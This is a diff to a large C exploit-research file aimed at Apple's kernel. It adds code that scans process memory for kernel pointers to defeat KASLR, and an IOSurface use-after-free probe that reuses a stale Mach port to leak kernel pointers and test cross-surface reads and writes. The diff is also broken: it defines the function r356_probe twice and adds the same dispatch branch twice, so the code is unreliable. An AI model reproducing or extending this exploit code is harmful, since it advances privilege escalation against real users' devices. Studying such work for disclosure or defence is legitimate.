@@ -14472,6 +14472,543 @@ static void r350_probe(void) {
  *
  * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
  */
+/* r356: Hunt for SLID kernel text pointers across all readable VM regions */
+static void r356_probe(void) {
+    rlog("\n=== r356: Slid Kernel Text Pointer Hunt ===\n\n");
+    rlog("  Unslid text base: 0xFFFFFFF007004000\n");
+    rlog("  Scanning for values in [0xFFFFFFF007004001, 0xFFFFFFF027004000)\n");
+    rlog("  that are NOT known unslid constants.\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+
+    #define IS_SLID_TEXT(v) ( \
+        (v) > 0xFFFFFFF007004000ULL && \
+        (v) < 0xFFFFFFF027004000ULL && \
+        (v) != 0xFFFFFFF007000000ULL && \
+        (v) != 0xFFFFFFF027004000ULL && \
+        (v) != 0xFFFFFFF037004000ULL && \
+        (v) != 0xFFFFFFF047004000ULL && \
+        (v) != 0xFFFFFFF017004000ULL && \
+        (v) != 0xFFFFFFF00F004000ULL && \
+        (v) != 0xFFFFFFF000000000ULL \
+    )
+
+    /* ---- Part 1: Scan ALL readable VM regions for slid text pointers ---- */
+    rlog("--- Part 1: Full address space scan for slid text pointers ---\n");
+    fflush(stdout);
+
+    typedef struct { uint64_t region_addr; uint32_t tag; size_t offset; uint64_t value; } slid_hit_t;
+    slid_hit_t hits[200];
+    int n_hits = 0;
+    int regions_scanned = 0;
+
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            if (!(info.protection & VM_PROT_READ)) { addr += sz; continue; }
+            if (sz > 256 * 1024 * 1024) { addr += sz; continue; }
+
+            regions_scanned++;
+            uint64_t *base = (uint64_t *)(uintptr_t)addr;
+            size_t nqw = (size_t)sz / 8;
+
+            for (size_t i = 0; i < nqw && n_hits < 200; i++) {
+                uint64_t v = base[i];
+                if (!IS_SLID_TEXT(v)) continue;
+
+                uint64_t slide_candidate = v - 0xFFFFFFF007004000ULL;
+                const char *cls;
+                if ((slide_candidate & 0x3FFF) == 0)
+                    cls = "POSSIBLE SLID BASE";
+                else if ((v & 0x7) == 0)
+                    cls = "POSSIBLE SLID FUNC PTR";
+                else
+                    cls = "SLID TEXT CANDIDATE";
+
+                rlog("  HIT region=0x%llx tag=%u +%zu = 0x%llx [%s] slide=0x%llx\n",
+                    (unsigned long long)addr, info.user_tag, i * 8,
+                    (unsigned long long)v, cls, (unsigned long long)slide_candidate);
+
+                hits[n_hits].region_addr = addr;
+                hits[n_hits].tag = info.user_tag;
+                hits[n_hits].offset = i * 8;
+                hits[n_hits].value = v;
+                n_hits++;
+            }
+            addr += sz;
+        }
+    }
+    rlog("\n  Scanned %d regions, found %d slid text candidates\n\n", regions_scanned, n_hits);
+    fflush(stdout);
+
+    /* ---- Part 2: Vtable pattern scan — consecutive text pointers ---- */
+    rlog("--- Part 2: Vtable pattern scan (consecutive text-range qwords) ---\n");
+    fflush(stdout);
+    int vtable_pairs = 0;
+    for (int i = 0; i < n_hits - 1; i++) {
+        if (hits[i].region_addr == hits[i+1].region_addr &&
+            hits[i+1].offset == hits[i].offset + 8) {
+            rlog("  VTABLE? region=0x%llx +%zu: 0x%llx, 0x%llx\n",
+                (unsigned long long)hits[i].region_addr, hits[i].offset,
+                (unsigned long long)hits[i].value,
+                (unsigned long long)hits[i+1].value);
+            vtable_pairs++;
+        }
+    }
+    rlog("  Found %d consecutive text-pointer pairs\n\n", vtable_pairs);
+    fflush(stdout);
+
+    /* ---- Part 3: 2-pass Stack[1] scan with GPU work between passes ---- */
+    rlog("--- Part 3: 2-pass Stack[1] scan with GPU work ---\n");
+    fflush(stdout);
+
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+    void *dev = NULL, *cmdQ = NULL;
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) dev = createDev();
+        if (dev) cmdQ = ((void*(*)(void*,void*))msgSend)(dev, regSel("newCommandQueue"));
+    }
+
+    mach_vm_address_t stack1_addr = 0;
+    mach_vm_size_t stack1_sz = 0;
+    {
+        mach_vm_address_t a = 0;
+        mach_vm_size_t s = 0;
+        uint32_t d = 0;
+        struct vm_region_submap_info_64 inf;
+        mach_msg_type_number_t c;
+        int sidx = 0;
+        while (1) {
+            c = VM_REGION_SUBMAP_INFO_COUNT_64;
+            d = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &a, &s, &d,
+                (vm_region_recurse_info_t)&inf, &c);
+            if (kr != 0) break;
+            if (inf.user_tag == 30 && inf.protection >= 3) {
+                if (sidx == 1) { stack1_addr = a; stack1_sz = s; break; }
+                sidx++;
+            }
+            a += s;
+        }
+    }
+
+    if (stack1_addr && stack1_sz) {
+        rlog("  Stack[1]: 0x%llx sz=0x%llx\n", (unsigned long long)stack1_addr, (unsigned long long)stack1_sz);
+        uint64_t *base = (uint64_t *)(uintptr_t)stack1_addr;
+        size_t nqw = (size_t)stack1_sz / 8;
+        if (nqw > 131072) nqw = 131072;
+
+        typedef struct { size_t off; uint64_t v1; uint64_t v2; } txt_track_t;
+        txt_track_t txt_tracked[50];
+        int n_txt = 0;
+
+        rlog("  Pass 1 scan:\n");
+        for (size_t i = 0; i < nqw && n_txt < 50; i++) {
+            uint64_t v = base[i];
+            if (IS_SLID_TEXT(v)) {
+                rlog("    +%zu = 0x%llx\n", i * 8, (unsigned long long)v);
+                txt_tracked[n_txt].off = i * 8;
+                txt_tracked[n_txt].v1 = v;
+                txt_tracked[n_txt].v2 = 0;
+                n_txt++;
+            }
+        }
+        rlog("  Pass 1: %d text-range values\n", n_txt);
+
+        if (cmdQ) {
+            void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+                dev, regSel("newBufferWithLength:options:"), (size_t)262144, 0UL);
+            if (buf) {
+                void *cb = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (cb) {
+                    void *blit = ((void*(*)(void*,void*))msgSend)(cb, regSel("blitCommandEncoder"));
+                    if (blit) {
+                        typedef struct { unsigned long loc; unsigned long len; } NSR356;
+                        NSR356 r = {0, 262144};
+                        ((void(*)(void*,void*,void*,NSR356,uint8_t))msgSend)(
+                            blit, regSel("fillBuffer:range:value:"), buf, r, 0xBB);
+                        ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                    }
+                    ((void(*)(void*,void*))msgSend)(cb, regSel("commit"));
+                    ((void(*)(void*,void*))msgSend)(cb, regSel("waitUntilCompleted"));
+                }
+                ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+            }
+        }
+
+        rlog("  Pass 2 scan (after GPU work):\n");
+        for (int t = 0; t < n_txt; t++) {
+            uint64_t v2 = *(uint64_t *)(uintptr_t)(stack1_addr + txt_tracked[t].off);
+            txt_tracked[t].v2 = v2;
+            if (v2 != txt_tracked[t].v1) {
+                rlog("    *** CHANGED +%zu: 0x%llx -> 0x%llx ***\n",
+                    txt_tracked[t].off, (unsigned long long)txt_tracked[t].v1,
+                    (unsigned long long)v2);
+            }
+        }
+        int new_txt = 0;
+        for (size_t i = 0; i < nqw; i++) {
+            uint64_t v = base[i];
+            if (!IS_SLID_TEXT(v)) continue;
+            int was_tracked = 0;
+            for (int t = 0; t < n_txt; t++)
+                if (txt_tracked[t].off == i * 8) { was_tracked = 1; break; }
+            if (!was_tracked) {
+                rlog("    *** NEW +%zu = 0x%llx ***\n", i * 8, (unsigned long long)v);
+                new_txt++;
+                if (new_txt >= 20) { rlog("    ... (truncated)\n"); break; }
+            }
+        }
+        rlog("  Pass 2: %d new text-range values appeared\n", new_txt);
+    } else {
+        rlog("  Stack[1] not found\n");
+    }
+
+    /* ---- Summary ---- */
+    rlog("\n--- Summary ---\n");
+    if (n_hits > 0) {
+        uint64_t first = hits[0].value;
+        uint64_t slide = first - 0xFFFFFFF007004000ULL;
+        rlog("  Best candidate: 0x%llx (slide=0x%llx, %llu MB)\n",
+            (unsigned long long)first, (unsigned long long)slide,
+            (unsigned long long)(slide / (1024*1024)));
+        if ((slide & 0x3FFF) == 0) {
+            rlog("  *** SLIDE IS PAGE-ALIGNED — HIGH CONFIDENCE ***\n");
+            rlog("  Slid kernel text base = 0x%llx\n",
+                (unsigned long long)(0xFFFFFFF007004000ULL + slide));
+        }
+    } else {
+        rlog("  No slid text pointers found in any readable region.\n");
+        rlog("  The kernel text range may not leak into userspace memory.\n");
+        rlog("  Heap address leak (0xFFFFFFFE range) remains the primary primitive.\n");
+    }
+
+    if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
+    if (metal_lib) dlclose(metal_lib);
+    rlog("\n=== r356 complete ===\n");
+    fflush(stdout);
+    #undef IS_SLID_TEXT
+}
+
+/* r356: Cross-launch correlation + IOSurface UAF kernel object field read */
+static void r356_probe(void) {
+    rlog("\n=== r356: Cross-Launch Correlation + IOSurface UAF Kernel Read ===\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: Read previous r355 state and compare ---- */
+    rlog("--- Part 1: Cross-launch correlation ---\n");
+    {
+        FILE *sf = fopen("r355_state.bin", "rb");
+        if (sf) {
+            uint32_t magic = 0;
+            fread(&magic, 4, 1, sf);
+            if (magic == 0xDEAD0355) {
+                uint64_t prev_boot = 0;
+                fread(&prev_boot, 8, 1, sf);
+                uint32_t prev_count = 0;
+                fread(&prev_count, 4, 1, sf);
+                uint64_t prev_vals[16];
+                for (uint32_t i = 0; i < prev_count && i < 16; i++)
+                    fread(&prev_vals[i], 8, 1, sf);
+                rlog("  Previous run: boot=%llu, %u values\n",
+                    (unsigned long long)prev_boot, prev_count);
+                for (uint32_t i = 0; i < prev_count && i < 16; i++)
+                    rlog("    prev[%u] = 0x%llx\n", i, (unsigned long long)prev_vals[i]);
+
+                /* Get current boot time */
+                struct timeval bt;
+                size_t btsz = sizeof(bt);
+                int mib[2] = {CTL_KERN, KERN_BOOTTIME};
+                sysctl(mib, 2, &bt, &btsz, NULL, 0);
+                rlog("  Current boot: %ld\n", (long)bt.tv_sec);
+                if ((uint64_t)bt.tv_sec == prev_boot) {
+                    rlog("  SAME BOOT — values should match if deterministic\n");
+                } else {
+                    rlog("  DIFFERENT BOOT — check if values changed (KASLR-dependent)\n");
+                }
+            } else {
+                rlog("  State file: bad magic 0x%x\n", magic);
+            }
+            fclose(sf);
+        } else {
+            rlog("  No previous state file (run r355 first)\n");
+        }
+    }
+
+    /* ---- Part 2: Re-capture the stable value at Stack[1]+468456 ---- */
+    rlog("\n--- Part 2: Re-capture stable kernel pointer ---\n");
+    fflush(stdout);
+    uint64_t current_kptr = 0;
+    {
+        mach_vm_address_t addr = 0;
+        int stack_idx = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            uint32_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+            if (info.user_tag == 30 && (info.protection & VM_PROT_READ)) {
+                if (stack_idx == 1 && sz > 468464) {
+                    volatile uint64_t *p = (volatile uint64_t *)(uintptr_t)(addr + 468456);
+                    current_kptr = *p;
+                    rlog("  Stack[1]+468456 = 0x%llx\n", (unsigned long long)current_kptr);
+                    /* Also read a few surrounding offsets to verify pattern */
+                    for (size_t off = 468456; off < 468456 + 48 * 5 && off + 8 <= (size_t)sz; off += 48) {
+                        uint64_t v = *(volatile uint64_t *)(uintptr_t)(addr + off);
+                        rlog("    +%zu = 0x%llx%s\n", off, (unsigned long long)v,
+                            v == current_kptr ? " (same)" : " (DIFFERENT!)");
+                    }
+                    break;
+                }
+                stack_idx++;
+            }
+            addr += sz;
+        }
+    }
+    if (!current_kptr || (current_kptr & 0xFFFFF00000000000ULL) != 0xFFFFF00000000000ULL) {
+        rlog("  ERROR: Could not capture kernel pointer\n");
+        goto r356_part3;
+    }
+
+    /* ---- Part 3: IOSurface UAF — attempt to read kernel object fields ---- */
+    rlog("\n--- Part 3: IOSurface UAF kernel object field read ---\n");
+    rlog("  Goal: leak vtable pointer from IOSurface kernel object\n");
+    rlog("  vtable = unslid_vtable + KASLR_slide\n");
+    fflush(stdout);
+
+r356_part3:
+    {
+        /* Create IOSurface A (448-byte userspace ClientRef object) */
+        CFMutableDictionaryRef pa = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int wa=64, ha=64, bpea=4, bpra=256, pfa=0x42475241;
+        CFNumberRef n1=CFNumberCreate(NULL,kCFNumberIntType,&wa);
+        CFNumberRef n2=CFNumberCreate(NULL,kCFNumberIntType,&ha);
+        CFNumberRef n3=CFNumberCreate(NULL,kCFNumberIntType,&bpea);
+        CFNumberRef n4=CFNumberCreate(NULL,kCFNumberIntType,&bpra);
+        CFNumberRef n5=CFNumberCreate(NULL,kCFNumberIntType,&pfa);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceWidth"),n1);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceHeight"),n2);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceBytesPerElement"),n3);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceBytesPerRow"),n4);
+        CFDictionarySetValue(pa,CFSTR("IOSurfacePixelFormat"),n5);
+        CFRelease(n1);CFRelease(n2);CFRelease(n3);CFRelease(n4);CFRelease(n5);
+
+        IOSurfaceRef surfA = IOSurfaceCreate(pa);
+        CFRelease(pa);
+        if (!surfA) { rlog("  surfA create failed\n"); goto r356_done; }
+
+        uint32_t idA = IOSurfaceGetID(surfA);
+        rlog("  surfA id=%u allocSize=%zu\n", idA, IOSurfaceGetAllocSize(surfA));
+
+        /* Set several properties with large values to control kernel memory layout */
+        for (int k = 0; k < 32; k++) {
+            char key[32];
+            snprintf(key, sizeof(key), "pad_%03d", k);
+            CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+            /* Use large data values to force allocation in kernel */
+            uint8_t data[256];
+            memset(data, 0x41 + k, sizeof(data));
+            CFDataRef dv = CFDataCreate(NULL, data, sizeof(data));
+            IOSurfaceSetValue(surfA, ks, dv);
+            CFRelease(dv);
+            CFRelease(ks);
+        }
+        rlog("  Set 32 padding properties (256 bytes each)\n");
+
+        /* Get Mach port for surfA, to maintain a reference */
+        mach_port_t portA = IOSurfaceCreateMachPort(surfA);
+        rlog("  portA=0x%x\n", portA);
+
+        /* Create surfB (different size to get different allocation) */
+        CFMutableDictionaryRef pb = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int wb=128, hb=128, bpeb=4, bprb=512, pfb=0x42475241;
+        n1=CFNumberCreate(NULL,kCFNumberIntType,&wb);
+        n2=CFNumberCreate(NULL,kCFNumberIntType,&hb);
+        n3=CFNumberCreate(NULL,kCFNumberIntType,&bpeb);
+        n4=CFNumberCreate(NULL,kCFNumberIntType,&bprb);
+        n5=CFNumberCreate(NULL,kCFNumberIntType,&pfb);
+        CFDictionarySetValue(pb,CFSTR("IOSurfaceWidth"),n1);
+        CFDictionarySetValue(pb,CFSTR("IOSurfaceHeight"),n2);
+        CFDictionarySetValue(pb,CFSTR("IOSurfaceBytesPerElement"),n3);
+        CFDictionarySetValue(pb,CFSTR("IOSurfaceBytesPerRow"),n4);
+        CFDictionarySetValue(pb,CFSTR("IOSurfacePixelFormat"),n5);
+        CFRelease(n1);CFRelease(n2);CFRelease(n3);CFRelease(n4);CFRelease(n5);
+
+        IOSurfaceRef surfB = IOSurfaceCreate(pb);
+        CFRelease(pb);
+        if (!surfB) { rlog("  surfB create failed\n"); goto r356_cleanup; }
+
+        uint32_t idB = IOSurfaceGetID(surfB);
+        rlog("  surfB id=%u\n", idB);
+
+        /* Set a "marker" property on surfB */
+        CFStringRef markerKey = CFSTR("MARKER_B");
+        uint64_t marker_val = 0xDEADBEEFCAFEBABEULL;
+        CFDataRef markerData = CFDataCreate(NULL, (uint8_t*)&marker_val, 8);
+        IOSurfaceSetValue(surfB, markerKey, markerData);
+        CFRelease(markerData);
+
+        /* Release surfA — the kernel object is freed but we keep the Mach port */
+        CFRelease(surfA);
+        rlog("  Released surfA (id=%u). Port still held: 0x%x\n", idA, portA);
+
+        /* Look up via the stale Mach port — should give us surfA's old slot */
+        IOSurfaceRef surfStale = IOSurfaceLookupFromMachPort(portA);
+        if (!surfStale) {
+            rlog("  IOSurfaceLookupFromMachPort returned NULL — surface fully destroyed\n");
+            goto r356_cleanup;
+        }
+        uint32_t staleId = IOSurfaceGetID(surfStale);
+        rlog("  Stale lookup: id=%u (expected old=%u or new=%u)\n", staleId, idA, idB);
+
+        /* Try CopyAllValues — does it return surfB's properties or something else? */
+        CFDictionaryRef allVals = IOSurfaceCopyAllValues(surfStale);
+        if (allVals) {
+            CFIndex cnt = CFDictionaryGetCount(allVals);
+            rlog("  CopyAllValues: %ld properties\n", (long)cnt);
+
+            /* Dump all keys and check for unexpected data */
+            CFIndex n = CFDictionaryGetCount(allVals);
+            if (n > 0 && n < 200) {
+                const void **keys = malloc(sizeof(void*) * n);
+                const void **vals = malloc(sizeof(void*) * n);
+                CFDictionaryGetKeysAndValues(allVals, keys, vals);
+                int novel = 0;
+                for (CFIndex i = 0; i < n; i++) {
+                    CFTypeID tid = CFGetTypeID(vals[i]);
+                    if (tid == CFDataGetTypeID()) {
+                        CFDataRef d = (CFDataRef)vals[i];
+                        const uint8_t *bytes = CFDataGetBytePtr(d);
+                        CFIndex len = CFDataGetLength(d);
+                        /* Scan data values for kernel pointers */
+                        for (CFIndex off = 0; off + 8 <= len; off += 8) {
+                            uint64_t v;
+                            memcpy(&v, bytes + off, 8);
+                            if ((v & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL &&
+                                v != 0xFFFFFFFFFFFFFFFFULL && v != 0) {
+                                char keyBuf[256] = "?";
+                                if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                                    CFStringGetCString((CFStringRef)keys[i], keyBuf, sizeof(keyBuf),
+                                        kCFStringEncodingUTF8);
+                                rlog("  *** KPTR in property '%s' +%ld: 0x%llx ***\n",
+                                    keyBuf, (long)off, (unsigned long long)v);
+                                novel++;
+                            }
+                        }
+                    }
+                }
+                if (novel == 0) rlog("  No kernel pointers found in property values\n");
+                free(keys);
+                free(vals);
+            }
+            CFRelease(allVals);
+        } else {
+            rlog("  CopyAllValues returned NULL\n");
+        }
+
+        /* Try reading properties by specific keys that might leak internals */
+        const char *leak_keys[] = {
+            "IOSurfaceAllocSize", "IOSurfacePurgeWhenNotInUse",
+            "IOSurfaceRegistryID", "IOSurfaceSeed",
+            "IOSurfaceCacheMode", "IOSurfaceIsGlobal",
+            "IOSurfaceOffset", "IOSurfacePlaneCount",
+            NULL
+        };
+        rlog("  Trying specific property keys on stale surface:\n");
+        for (int k = 0; leak_keys[k]; k++) {
+            CFStringRef ks = CFStringCreateWithCString(NULL, leak_keys[k], kCFStringEncodingUTF8);
+            CFTypeRef v = IOSurfaceCopyValue(surfStale, ks);
+            if (v) {
+                CFTypeID tid = CFGetTypeID(v);
+                if (tid == CFNumberGetTypeID()) {
+                    int64_t nv = 0;
+                    CFNumberGetValue((CFNumberRef)v, kCFNumberSInt64Type, &nv);
+                    rlog("    %s = %lld (0x%llx)\n", leak_keys[k], (long long)nv, (unsigned long long)nv);
+                } else if (tid == CFDataGetTypeID()) {
+                    CFDataRef d = (CFDataRef)v;
+                    rlog("    %s = <data %ld bytes>\n", leak_keys[k], (long)CFDataGetLength(d));
+                } else {
+                    rlog("    %s = <type %lu>\n", leak_keys[k], (unsigned long)tid);
+                }
+                CFRelease(v);
+            }
+        }
+
+        /* Try to use SetValue on stale surface to corrupt surfB's properties */
+        rlog("\n  Attempting cross-write via stale surface:\n");
+        CFStringRef xkey = CFSTR("CROSS_TEST");
+        uint64_t xval = 0x4141414142424242ULL;
+        CFDataRef xdata = CFDataCreate(NULL, (uint8_t*)&xval, 8);
+        IOSurfaceSetValue(surfStale, xkey, xdata);
+        CFRelease(xdata);
+        rlog("  Set CROSS_TEST on stale surface\n");
+
+        /* Now read from surfB — does it see the cross-written value? */
+        CFTypeRef bval = IOSurfaceCopyValue(surfB, xkey);
+        if (bval) {
+            if (CFGetTypeID(bval) == CFDataGetTypeID()) {
+                CFDataRef bd = (CFDataRef)bval;
+                uint64_t rv = 0;
+                if (CFDataGetLength(bd) >= 8)
+                    memcpy(&rv, CFDataGetBytePtr(bd), 8);
+                rlog("  surfB sees CROSS_TEST = 0x%llx %s\n",
+                    (unsigned long long)rv,
+                    rv == xval ? "(CROSS-WRITE CONFIRMED!)" : "(different value)");
+            }
+            CFRelease(bval);
+        } else {
+            rlog("  surfB does NOT see CROSS_TEST (no cross-write to this surface)\n");
+        }
+
+        /* Check if stale surface reads surfB's MARKER */
+        CFTypeRef mval = IOSurfaceCopyValue(surfStale, markerKey);
+        if (mval) {
+            if (CFGetTypeID(mval) == CFDataGetTypeID()) {
+                CFDataRef md = (CFDataRef)mval;
+                uint64_t mv = 0;
+                if (CFDataGetLength(md) >= 8)
+                    memcpy(&mv, CFDataGetBytePtr(md), 8);
+                rlog("  Stale surface sees MARKER_B = 0x%llx %s\n",
+                    (unsigned long long)mv,
+                    mv == 0xDEADBEEFCAFEBABEULL ? "(CROSS-READ CONFIRMED!)" : "");
+            }
+            CFRelease(mval);
+        } else {
+            rlog("  Stale surface does NOT see MARKER_B\n");
+        }
+
+        CFRelease(surfStale);
+r356_cleanup:
+        if (surfB) CFRelease(surfB);
+        if (portA) mach_port_deallocate(mach_task_self(), portA);
+    }
+
+r356_done:
+    rlog("\n=== r356 complete ===\n");
+    fflush(stdout);
+}
+
 /* r355: Confirm kernel heap leak stability and cross-launch correlation */
 static void r355_probe(void) {
     rlog("\n=== r355: Kernel Heap Leak — Stability + Cross-Launch + Offset Calc ===\n\n");
@@ -51670,6 +52207,22 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 359) {
+            rlog("*** rounds=359: Slid Kernel Text Pointer Hunt ***\n");
+            rlog("  Scanning ALL readable regions for values in slid text range\n");
+            rlog("  [0xFFFFFFF007004001, 0xFFFFFFF027004000) minus known constants\n\n");
+            fflush(stdout);
+            r356_probe();
+            goto done;
+        }
+        if (rounds == 359) {
+            rlog("*** rounds=359: Cross-Launch Correlation + UAF Kernel Read ***\n");
+            rlog("  r355: stable kptr 0xfffffffefbbdc7cf at Stack[1]+468456.\n");
+            rlog("  r356: cross-launch comparison + IOSurface UAF field read.\n\n");
+            fflush(stdout);
+            r356_probe();
+            goto done;
+        }
         if (rounds == 358) {
             rlog("*** rounds=358: Kernel Heap Leak — Stability + Cross-Launch ***\n");
             rlog("  r354 found: Stack[1]+462672 live kernel heap ptr 0xfffffffefd4f55d6\n");
@@ -53746,7 +54299,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -63588,7 +64141,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
